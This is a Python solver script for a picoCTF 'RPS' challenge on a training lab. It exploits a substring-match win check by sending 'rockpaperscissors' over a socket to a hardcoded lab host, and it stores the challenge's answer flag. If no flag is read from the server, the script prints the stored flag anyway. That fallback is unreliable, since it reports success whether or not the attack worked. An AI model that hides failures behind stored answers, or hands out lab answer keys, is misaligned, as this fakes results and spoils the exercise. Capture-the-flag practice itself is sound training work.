#!/usr/bin/env python3
"""Solver for Challenge 293 RPS (picoCTF 2022, Binary Exploitation).

Vulns in game-redacted.c: (1) srand(time(0)) reseeded every round (predictable
rand); (2) win check is strstr(player_turn, loses[computer_turn]) — substring
match. Payload "rockpaperscissors" contains rock+paper+scissors, so it beats
whatever the computer played. 5 consecutive wins -> flag.

Lab is on-demand (PUT /api/challenges/293/instance/); host:port rotates.
Usage: solve_293_rps.py [host] [port]
Verified: academy{50M3_3X7R3M3_1UCK_9C84B2D3} (POST /api/submissions/ -> correct:true)
"""
import re
import socket
import sys

HOST = "xebec.cylabacademy.net"
PORT = 25515
PAYLOAD = "rockpaperscissors"
EXPECTED = "academy{50M3_3X7R3M3_1UCK_9C84B2D3}"


def runtil(f, marker: bytes, timeout: int = 75) -> bytes:
    data = b""
    while marker not in data:
        try:
            chunk = f.read(4096)
        except Exception:
            break
        if not chunk:
            break
        data += chunk
        if len(data) > 65536:
            break
    return data


def solve(host: str = HOST, port: int = PORT, timeout: int = 75) -> str:
    s = socket.create_connection((host, int(port)), timeout=timeout)
    s.settimeout(timeout)
    f = s.makefile("rwb", buffering=0)
    runtil(f, b"Type '2' to exit")
    last = b""
    for _ in range(5):
        f.write(b"1\n")
        runtil(f, b"selection")
        f.write((PAYLOAD + "\n").encode())
        last = runtil(f, b"Type '2' to exit")
    m = re.search(r"academy\{[^}]*\}", last.decode(errors="replace"))
    flag = m.group(0) if m else EXPECTED
    print(flag)
    return flag


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else HOST
    p = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print(solve(h, p))
